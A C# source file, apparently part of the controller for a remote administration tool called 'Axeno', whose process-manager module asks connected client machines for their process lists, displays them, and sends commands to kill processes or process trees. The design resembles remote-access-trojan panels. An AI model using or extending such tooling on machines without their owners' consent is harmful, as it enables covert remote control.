using Axeno.Helper;
using Axeno.MessagePack;
using Axeno.Networking.Connection;
using Org.BouncyCastle.Crypto.Paddings;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;

namespace Axeno.Networking.Functions.System
{
    internal class ProcessManager
    {
        public static byte[] SendCommand()
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "RetrieveProcesses";
            return msgPack.Encode2Bytes();
        }
        public void Handle(Client cli, MsgPack mpack)
        {
            cli.Proc_mgr.lvinfo.Items.Clear();
            string proc_unpack = mpack.ForcePathObject("Processes").AsString;
            string substring = proc_unpack.Substring(0, proc_unpack.Length - 11);

            string[] processList = substring.Split(new[] { "(SPLITHERE)" }, StringSplitOptions.None);


            Task.Run(() =>
            {
                foreach (string proc in processList)
                {
                    ProcessManagerLV lvitm = new ProcessManagerLV();

                    lvitm.processName = Between("Process(", ")", proc);
                    lvitm.startTime = Between("StartTime(", ")", proc);
                    lvitm.privbytes = Between("PrivateBytes(", ")", proc);
                    lvitm.workingSet = Between("WorkingSet(", ")", proc);
                    lvitm.processID = Between("ProcessID(", ")", proc);
                    lvitm.company = Between("Company(", ")", proc);
                    lvitm.description = Between("Description(", ")", proc);

                    cli.Proc_mgr.Dispatcher.Invoke(() =>
                    {
                        cli.Proc_mgr.lvinfo.Items.Add(lvitm);
                    });
                }
            }).ContinueWith((t) =>
            {
                cli.Proc_mgr.Dispatcher.Invoke(() =>
                {
                    cli.Proc_mgr.progring.Visibility = Visibility.Hidden;
                    cli.Proc_mgr.lvinfo.IsEnabled = true;
                });
            });
        }
        public static string Between(string startDelimiter, string endDelimiter, string inputString)
        {
            // define the regular expression pattern
            string pattern = string.Format("{0}(.*?){1}", Regex.Escape(startDelimiter), Regex.Escape(endDelimiter));

            // use Regex.Match to find the first occurrence of the pattern in the input string
            Match match = Regex.Match(inputString, pattern);

            // check if a match was found
            if (match.Success)
            {
                // get the captured group value
                return match.Groups[1].Value;
            }
            else
            {
                return string.Empty;
            }
        }
        public static void KillProcess(string procid, Client cli)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "KillProcess";
            msgPack.ForcePathObject("ID").AsString = procid;
            cli.QueueCommand(msgPack.Encode2Bytes());
        }
        public static void KillProcessTree(string name, Client cli)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "KillProcessTree";
            msgPack.ForcePathObject("Name").AsString = name;
            cli.QueueCommand(msgPack.Encode2Bytes());
        }
        public void HandleKilled(Client cli, MsgPack mpack)
        {
            string result = mpack.ForcePathObject("Result").AsString;
            if (result == "Success")
            {
                cli.QueueCommand(SendCommand());
            }else
            {
                MessageBox.Show("The process could not be killed.", "Process Manager", MessageBoxButton.OK, MessageBoxImage.Error);
            }

        }
    }
}
